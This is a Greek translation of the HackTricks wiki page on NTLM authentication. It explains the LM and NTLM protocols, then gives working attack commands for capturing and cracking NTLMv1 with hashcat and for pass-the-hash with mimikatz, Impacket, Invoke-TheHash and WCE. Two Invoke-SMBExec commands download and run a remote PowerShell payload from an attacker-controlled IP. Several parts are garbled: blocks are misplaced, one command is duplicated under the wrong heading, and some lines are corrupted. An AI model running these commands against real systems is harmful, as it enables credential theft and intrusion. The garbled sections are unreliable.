# NTLM

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας να διαφημίζεται στο HackTricks**; ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Βασικές Πληροφορίες

Σε περιβάλλοντα όπου λειτουργούν τα **Windows XP και Server 2003**, χρησιμοποιούνται τα hashes του LM (Lan Manager), αν και είναι ευρέως αναγνωρισμένο ότι μπορούν να διαρρεύσουν εύκολα. Ένα συγκεκριμένο hash του LM, `AAD3B435B51404EEAAD3B435B51404EE`, υποδηλώνει ένα σενάριο όπου δεν χρησιμοποιείται το LM, αντιπροσωπεύοντας το hash για μια κενή συμβολοσειρά.

Από προεπιλογή, το πρωτόκολλο πιστοποίησης **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) ενεργοποιείται υπό συγκεκριμένες συνθήκες: απουσία του Active Directory, μη ύπαρξη του τομέα, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης, ή όταν γίνονται προσπάθειες σύνδεσης χρησιμοποιώντας μια διεύθυνση IP αντί για έγκυρο όνομα κεντρικού υπολογιστή.

Η παρουσία του κεφαλίδας **"NTLMSSP"** σε πακέτα δικτύου υποδηλώνει ένα διαδικασία πιστοποίησης NTLM.

Η υποστήριξη για τα πρωτόκολλα πιστοποίησης - LM, NTLMv1 και NTLMv2 - διευκολύνεται από ένα συγκεκριμένο DLL που βρίσκεται στο `%windir%\Windows\System32\msv1\_0.dll`.

**Κύρια Σημεία**:

* Τα hashes του LM είναι ευάλωτα και ένα κενό hash του LM (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει τη μη χρήση του.
* Το Kerberos είναι η προεπιλεγμένη μέθοδος πιστοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
* Τα πακέτα πιστοποίησης NTLM είναι αναγνωρίσιμα από τον κεφαλίδα "NTLMSSP".
* Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το αρχείο συστήματος `msv1\_0.dll`.

## LM, NTLMv1 και NTLMv2

Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο πρωτόκολλο θα χρησιμοποιηθεί:

### Γραφικό Περιβάλλον Χρήστη (GUI)

Εκτελέστε _secpol.msc_ -> Τοπικές πολιτικές -> Επιλογές Ασφάλειας -> Ασφάλεια Δικτύου: Επίπεδο πιστοποίησης LAN Manager. Υπάρχουν 6 επίπεδα (από 0 έως 5).

![](<../../.gitbook/assets/image (919).png>)

### Κατάλογος Μητρώου (Registry)

Αυτό θα ορίσει το επίπεδο 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Δυνατές τιμές:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Βασικό Σχήμα Ταυτοποίησης Πεδίου NTLM

1. Ο **χρήστης** εισάγει τα **διαπιστευτήριά του**
2. Η μηχανή πελάτης **στέλνει ένα αίτημα ταυτοποίησης** στέλνοντας το **όνομα του τομέα** και το **όνομα χρήστη**
3. Ο **διακομιστής** στέλνει τη **πρόκληση**
4. Η **μηχανή πελάτης κρυπτογραφεί** τη **πρόκληση** χρησιμοποιώντας το hash του κωδικού ως κλειδί και την στέλνει ως απάντηση
5. Ο **διακομιστής στέλνει** στον **ελεγκτή τομέα** το **όνομα τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση**. Αν **δεν** υπάρχει ρυθμισμένος Ενεργός Κατάλογος ή το όνομα τομέα είναι το όνομα του διακομιστή, τα διαπιστευτήρια ελέγχονται **τοπικά**.
6. Ο **ελεγκτής τομέα ελέγχει αν είναι όλα σωστά** και στέλνει τις πληροφορίες στο διακομιστή

Ο **διακομιστής** και ο **Ελεγκτής τομέα** μπορούν να δημιουργήσουν ένα **Ασφαλές Κανάλι** μέσω του **Διακομιστή Netlogon** καθώς ο Ελεγκτής τομέα γνωρίζει τον κωδικό του διακομιστή (βρίσκεται μέσα στη βάση δεδομένων **NTDS.DIT**).

### Τοπικό Σχήμα Ταυτοποίησης NTLM

Η ταυτοποίηση είναι όπως αυτή που αναφέρθηκε **πριν αλλά** ο **διακομιστής** γνωρίζει το **hash του χρήστη** που προσπαθεί να ταυτοποιηθεί μέσα στο αρχείο **SAM**. Έτσι, αντί να ζητήσει από τον Ελεγκτή τομέα, ο **διακομιστής θα ελέγξει μόνος του** αν ο χρήστης μπορεί να ταυτοποιηθεί.

### Πρόκληση NTLMv1

Το **μήκος της πρόκλησης είναι 8 bytes** και η **απάντηση είναι 24 bytes** μακριά.

Το **hash NT (16bytes)** διαιρείται σε **3 μέρη των 7bytes το καθένα** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος συμπληρώνεται με μηδενικά**. Στη συνέχεια, η **πρόκληση** κρυπτογραφείται ξεχωριστά με κάθε μέρος και τα **αποτελέσματα** της κρυπτογράφησης **συνδυάζονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.

**Προβλήματα**:

* Έλλειψη **τυχαιότητας**
* Τα 3 μέρη μπορούν να **επιτεθούν ξεχωριστά** για να βρεθεί το NT hash
* Το **DES είναι ευάλωτο**
* Το 3ο κλειδί αποτελείται πάντα από **5 μηδενικά**.
* Δεδομένης της **ίδιας πρόκλησης** η **απάντηση** θα είναι **ίδια**. Έτσι, μπορείτε να δώσετε ως **πρόκληση** στο θύμα το συμβολοσειρά "**1122334455667788**" και να επιτεθείτε στην απάντηση χρησιμοποιώντας **προ-υπολογισμένους πίνακες ουράς**.

### Επίθεση NTLMv1

Σήμερα είναι λιγότερο συνηθισμένο να βρείτε περιβάλλοντα με ρυθμισμένη Ανεμπόδιστη Ανάθεση, αλλά αυτό δεν σημαίνει ότι δεν μπορείτε να **καταχραστείτε έναν υπηρεσία Εκτύπωσης Εκτύπωσης** που είναι ρυθμισμένη.

Θα μπορούσατε να καταχραστείτε κάποια διαπιστευτήρια/συνεδρίες που ήδη έχετε στο AD για να **ζητήσετε από τον εκτυπωτή να ταυτοποιηθεί** εναντίον κάποιου **οικοδεσπότη υπό τον έλεγχό σας**. Στη συνέχεια, χρησιμοποιώντας `metasploit auxiliary/server/capture/smb` ή `responder` μπορείτε να **ορίσετε την πρόκληση ταυτοποίησης σε 1122334455667788**, να καταγράψετε την προσπάθεια ταυτοποίησης και αν αυτή έγινε με χρήση **NTLMv1** θα μπορείτε να την **αποκρυπτογραφήσετε**.\
Αν χρησιμοποιείτε το `responder` μπορείτε να προσπαθήσετε να \*\*χρησιμοποιήσετε τη σημαία `--lm` \*\* για να προσπαθήσετε να **υποβαθμίσετε** την **ταυτοποίηση**.\
_Σημειώστε ότι για αυτήν την τεχνική η ταυτοποίηση πρέπει να γίνει χρησιμοποιώντας NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._

Θυμηθείτε ότι ο εκτυπωτής θα χρησιμοποιήσει το λογαριασμό υπολογιστή κατά την ταυτοποίηση, και οι λογαριασμοί υπολογιστών χρησιμοποιούν **μακρούς και τυχαίους κωδικούς πρόσβασης** που πιθανόν **δεν θα μπορέσετε να αποκρυπτογραφήσετε** χρησιμοποιώντας κοινά **λεξικά**. Αλλά η ταυτοποίηση **NTLMv1** χρησιμοποιεί **DES** ([περισσότερες πληροφορίες εδώ](./#ntlmv1-challenge)), οπότε χρησιμοποιώντας κάποιες υπηρεσίες ειδικά αφιερωμένες στο σπάσιμο του DES θα μπορέσετε να το σπάσετε (μπορείτε να χρησιμοποιήσετε [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com) για παράδειγμα).

### Επίθεση NTLMv1 με hashcat

Το NTLMv1 μπορεί επίσης να σπάσει με το NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) το οποίο μορφοποιεί τα μηνύματα NTLMv1 με έναν τρόπο που μπορεί να σπάσει με το hashcat.

Η εντολή
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM

### Επίθεση Pass-the-Hash

Η επίθεση Pass-the-Hash είναι μια τεχνική εκμετάλλευσης που επιτρέπει σε έναν εισβολέα να χρησιμοποιήσει έναν κατακερματισμένο κωδικό πρόσβασης (hash) για να αυθεντικοποιηθεί σε ένα σύστημα, αντί να χρησιμοποιήσει τον πραγματικό κωδικό πρόσβασης. Αυτό μπορεί να αποφευχθεί με την εφαρμογή σκληρών πολιτικών ασφαλείας, όπως η χρήση NTLMv2, η απενεργοποίηση του NTLM από το περιβάλλον και η χρήση πιστοποίησης διπλής παρακολούθησης.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
```markdown
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for authentication in Windows environments.

### NTLM Hash

The NTLM hash is a cryptographic hash used in the NTLM authentication protocol. It is generated by using a cryptographic hash function on a user's password. The hash is used to authenticate users without sending their actual passwords over the network.

### NTLM Hash Cracking

NTLM hash cracking is the process of recovering a user's password from their NTLM hash. This is often done using tools like Hashcat or John the Ripper, which leverage brute-force and dictionary attacks to crack the hash.

### Protecting Against NTLM Hash Cracking

To protect against NTLM hash cracking, it is recommended to use strong, unique passwords that are resistant to brute-force attacks. Additionally, implementing multi-factor authentication can add an extra layer of security to prevent unauthorized access.
```
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Εκτελέστε το hashcat (η κατανεμημένη λειτουργία είναι η καλύτερη μέσω ενός εργαλείου όπως το hashtopolis) διότι αλλιώς θα πάρει αρκετές ημέρες.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Σε αυτήν την περίπτωση γνωρίζουμε ότι ο κωδικός πρόσβασης είναι password, οπότε θα κάνουμε "χειραγώγηση" για δείγματα επίδειξης:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Τώρα πρέπει να χρησιμοποιήσουμε τα εργαλεία του hashcat για να μετατρέψουμε τα σπασμένα κλειδιά des σε τμήματα του hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Τέλος η τελευταία μέρος:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
```markdown
### Σκληρυνση των ρυθμισεων του NTLM

Το NTLM ειναι ενα πρωτοκολλο αυθεντικοποιησης που χρησιμοποιειται συχνα σε περιβαλλοντα Windows. Ομως, ειναι ευαίσθητο σε πολλες επιθέσεις, συμπεριλαμβανομενης της επιθεσης Pass-the-Hash. Για να μειωθει ο κινδυνος απο επιθεσεις, μπορειτε να εφαρμοσετε τις παρακατω συστασεις:

1. **Απενεργοποιηση του NTLM:** Εαν δεν ειναι απαραιτητο, απενεργοποιηστε το NTLM και χρησιμοποιηστε μονο το Kerberos.

2. **Περιορισμος των αδειων NTLM:** Αν ειναι απαραιτητο να χρησιμοποιηθει το NTLM, περιοριστε τις αδειες NTLM σε ελαχιστον δυο.

3. **Εφαρμογη πολιτικης ασφαλειας:** Εφαρμοστε πολιτικες ομαδοποιησης για να περιορισετε τη χρηση του NTLM σε συγκεκριμενες ομαδες χρηστων.

Ακολουθωντας αυτες τις συστασεις, μπορειτε να ενισχυσετε την ασφαλεια του περιβαλλοντος Windows σας απο επιθεσεις που εκμεταλλευονται το NTLM.
```
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Πρόκληση NTLMv2

Το **μήκος της πρόκλησης είναι 8 bytes** και **στέλνονται 2 απαντήσεις**: Μία είναι **μήκους 24 bytes** και το μήκος της **άλλης** είναι **μεταβλητό**.

**Η πρώτη απάντηση** δημιουργείται με τον κρυπταλγόριθμο **HMAC\_MD5** του **συμβολοσειράς** που αποτελείται από τον **πελάτη και τον τομέα** και χρησιμοποιώντας ως **κλειδί** το **hash MD4** του **NT hash**. Στη συνέχεια, το **αποτέλεσμα** θα χρησιμοποιηθεί ως **κλειδί** για τον κρυπταλγόριθμο **HMAC\_MD5** της **πρόκλησης**. Σε αυτό, θα προστεθεί **μια πρόκληση πελάτη 8 bytes**. Σύνολο: 24 B.

Η **δεύτερη απάντηση** δημιουργείται χρησιμοποιώντας **πολλές τιμές** (μια νέα πρόκληση πελάτη, ένα **χρονικό σήμα** για να αποφευχθούν **επαναλαμβανόμενες επιθέσεις**...)

Αν έχετε ένα **pcap που έχει καταγράψει ένα επιτυχημένο διαδικασία πιστοποίησης**, μπορείτε να ακολουθήσετε αυτόν τον οδηγό για να ανακτήσετε τον τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση και να προσπαθήσετε να σπάσετε τον κωδικό πρόσβασης: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Αφού έχετε το hash του θύματος**, μπορείτε να το **υποκαταστήσετε**.\
Χρειάζεστε ένα **εργαλείο** που θα **εκτελέσει** την **επαλήθευση NTLM χρησιμοποιώντας** αυτό το **hash**, **ή** θα μπορούσατε να δημιουργήσετε ένα νέο **sessionlogon** και να **ενθωματώσετε** αυτό το **hash** μέσα στο **LSASS**, έτσι ώστε όταν γίνεται οποιαδήποτε **επαλήθευση NTLM**, αυτό το **hash θα χρησιμοποιηθεί.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.

**Παρακαλώ, θυμηθείτε ότι μπορείτε να εκτελέσετε επιθέσεις Pass-the-Hash χρησιμοποιώντας επίσης λογαριασμούς Υπολογιστών.**

### **Mimikatz**

**Χρειάζεται να εκτελεστεί ως διαχειριστής**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Αυτό θα εκκινήσει ένα διαδικασία που θα ανήκει στους χρήστες που έχουν εκκινήσει το mimikatz, αλλά εσωτερικά στο LSASS τα αποθηκευμένα διαπιστευτήρια είναι αυτά που βρίσκονται μέσα στις παραμέτρους του mimikatz. Έπειτα, μπορείτε να έχετε πρόσβαση σε δίκτυα πόρων ως αν υπήρχατε αυτός ο χρήστης (παρόμοιο με το κόλπο `runas /netonly` αλλά δεν χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης κειμένου).

### Pass-the-Hash από linux

Μπορείτε να αποκτήσετε εκτέλεση κώδικα σε μηχανές Windows χρησιμοποιώντας το Pass-the-Hash από το Linux.\
[**Πρόσβαση εδώ για να μάθετε πώς να το κάνετε.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Εργαλεία Impacket Windows που έχουν μεταγλωττιστεί

Μπορείτε να κατεβάσετε δυαδικά αρχεία impacket για Windows εδώ: [impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Σε αυτήν την περίπτωση πρέπει να καθορίσετε έναν εντολή, οι cmd.exe και powershell.exe δεν είναι έγκυροι για να λάβετε μια διαδραστική κέλυφος)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Υπάρχουν πολλά άλλα δυαδικά αρχεία Impacket...

### Invoke-TheHash

Μπορείτε να λάβετε τα σενάρια powershell από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Κλήση-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Κλήση-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Κλήση-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Κάλεσε-ΤοHash

Αυτή η λειτουργία είναι ένα **μείγμα** όλων των υπολοίπων. Μπορείτε να περάσετε **πολλούς οικοδεσπότες**, **αποκλείσετε** κάποιους και **επιλέξετε** τη **επιλογή** που θέλετε να χρησιμοποιήσετε (_SMBExec, WMIExec, SMBClient, SMBEnum_). Αν επιλέξετε **οποιοδήποτε** από **SMBExec** και **WMIExec** αλλά δεν δώσετε κανένα παράμετρο _**Εντολής**_ θα ελέγξει απλά αν έχετε **επαρκή δικαιώματα**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Περνώντας το Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Επεξεργαστής Διαπιστευτήρων των Windows (WCE)

**Χρειάζεται να εκτελεστεί ως διαχειριστής**

Αυτό το εργαλείο θα κάνει το ίδιο πράγμα με το mimikatz (τροποποίηση μνήμης LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Μηχανική εκτέλεσης απομακρυσμένων Windows με όνομα χρήστη και κωδικό πρόσβασης

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Εξαγωγή διαπιστευτήριων από έναν υπολογιστή Windows

**Για περισσότερες πληροφορίες σχετικά με** [**πώς να αποκτήσετε διαπιστευτήρια από έναν υπολογιστή Windows πρέπει να διαβάσετε αυτήν τη σελίδα**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay και Responder

**Διαβάστε ένα πιο λεπτομερή οδηγό σχετικά με το πώς να πραγματοποιήσετε αυτές τις επιθέσεις εδώ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Ανάλυση προκλήσεων NTLM από καταγραφή δικτύου

**Μπορείτε να χρησιμοποιήσετε** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
